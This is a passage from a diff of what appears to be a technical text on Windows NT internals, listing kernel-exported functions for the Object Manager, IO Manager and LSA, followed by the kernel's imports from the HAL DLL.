+ObQueryObjectAuditingByHandle
+ObReferenceObjectByHandle
+ObReferenceObjectByName
+ObReferenceObjectByPointer
+ObReleaseObjectSecurity
+ObSetSecurityDescriptorInfo
+
+Here are the exported functions for the IO Manager:
+IoAcquireCancelSpinLock
+IoAcquireVpbSpinLock
+IoAdapterObjectType
+IoAllocateAdapterChannel
+IoAllocateController
+IoAllocateErrorLogEntry
+IoAllocateIrp
+IoAllocateMdl
+IoAssignResources
+IoAttachDevice
+IoAttachDeviceByPointer
+IoAttachDeviceToDeviceStack
+IoBuildAsynchronousFsdRequest
+IoBuildDeviceIoControlRequest
+IoBuildPartialMdl
+IoBuildSynchronousFsdRequest
+IoCallDriver
+IoCancelIrp
+IoCheckDesiredAccess
+IoCheckEaBufferValidity
+IoCheckFunctionAccess
+IoCheckShareAccess
+IoCompleteRequest
+IoConnectInterrupt
+IoCreateController
+IoCreateDevice
+IoCreateFile
+IoCreateNotificationEvent
+IoCreateStreamFileObject
+IoCreateSymbolicLink
+IoCreateSynchronizationEvent
+IoCreateUnprotectedSymbolicLink
+IoDeleteController
+IoDeleteDevice
+IoDeleteSymbolicLink
+IoDetachDevice
+IoDeviceHandlerObjectSize
+IoDeviceHandlerObjectType
+IoDeviceObjectType
+IoDisconnectInterrupt
+IoDriverObjectType
+IoEnqueueIrp
+IoFastQueryNetworkAttributes
+IofCallDriver
+IofCompleteRequest
+IoFileObjectType
+IoFreeController
+IoFreeIrp
+IoFreeMdl
+IoGetAttachedDevice
+IoGetBaseFileSystemDeviceObject
+IoGetConfigurationInformation
+IoGetCurrentProcess
+IoGetDeviceObjectPointer
+IoGetDeviceToVerify
+IoGetFileObjectGenericMapping
+IoGetInitialStack
+IoGetRelatedDeviceObject
+IoGetRequestorProcess
+IoGetStackLimits
+IoGetTopLevelIrp
+IoInitializeIrp
+IoInitializeTimer
+IoIsOperationSynchronous
+IoIsSystemThread
+IoMakeAssociatedIrp
+IoOpenDeviceInstanceKey
+IoPageRead
+IoQueryDeviceDescription
+IoQueryDeviceEnumInfo
+IoQueryFileInformation
+IoQueryVolumeInformation
+IoQueueThreadIrp
+IoRaiseHardError
+IoRaiseInformationalHardError
+IoReadOperationCount
+IoReadTransferCount
+IoRegisterDriverReinitialization
+IoRegisterFileSystem
+IoRegisterFsRegistrationChange
+IoRegisterShutdownNotification
+IoReleaseCancelSpinLock
+IoReleaseVpbSpinLock
+IoRemoveShareAccess
+IoReportHalResourceUsage
+IoReportResourceUsage
+IoSetDeviceToVerify
+IoSetHardErrorOrVerifyDevice
+IoSetInformation
+IoSetShareAccess
+IoSetThreadHardErrorMode
+IoSetTopLevelIrp
+IoStartNextPacket
+IoStartNextPacketByKey
+IoStartPacket
+IoStartTimer
+IoStatisticsLock
+IoStopTimer
+IoSynchronousPageWrite
+IoThreadToProcess
+IoUnregisterFileSystem
+IoUnregisterFsRegistrationChange
+IoUnregisterShutdownNotification
+IoUpdateShareAccess
+IoVerifyVolume
+IoWriteErrorLogEntry
+IoWriteOperationCount
+IoWriteTransferCount
+
+Here are the exported functions for the LSA:
+LsaCallAuthenticationPackage
+LsaDeregisterLogonProcess
+LsaFreeReturnBuffer
+LsaLogonUser
+LsaLookupAuthenticationPackage
+LsaRegisterLogonProcess
+
+The only imports are from the HAL DLL:
+HAL.ExAcquireFastMutex
+HAL.ExReleaseFastMutex
+HAL.ExTryToAcquireFastMutex
+HAL.HalAllocateAdapterChannel
+HAL.HalBeginSystemInterrupt
+HAL.HalClearSoftwareInterrupt
+HAL.HalDisableSystemInterrupt
+HAL.HalDisplayString
+HAL.HalEnableSystemInterrupt
+HAL.HalEndSystemInterrupt
+HAL.HalGetEnvironmentVariable
+HAL.HalHandleNMI
+HAL.HalProcessorIdle
+HAL.HalQueryDisplayParameters
+HAL.HalRequestSoftwareInterrupt
+HAL.HalReturnToFirmware
+HAL.HalSetEnvironmentVariable
+HAL.HalSetRealTimeClock
+HAL.HalStartProfileInterrupt
+HAL.HalStopProfileInterrupt
+HAL.HalSystemVectorDispatchEntry
+HAL.KdPortPollByte
+HAL.KdPortRestore
+HAL.KdPortSave
+HAL.KeGetCurrentIrql
+HAL.KeLowerIrql
+HAL.KeRaiseIrql
+HAL.KeRaiseIrqlToDpcLevel
+HAL.KeRaiseIrqlToSynchLevel
+HAL.KfAcquireSpinLock
+HAL.KfLowerIrql
+HAL.KfRaiseIrql
+HAL.KfReleaseSpinLock
+HAL.READ_PORT_UCHAR
+HAL.READ_PORT_ULONG
+HAL.READ_PORT_USHORT
+HAL.WRITE_PORT_UCHAR
+HAL.WRITE_PORT_ULONG
+HAL.WRITE_PORT_USHORT
+
+----[  EOF
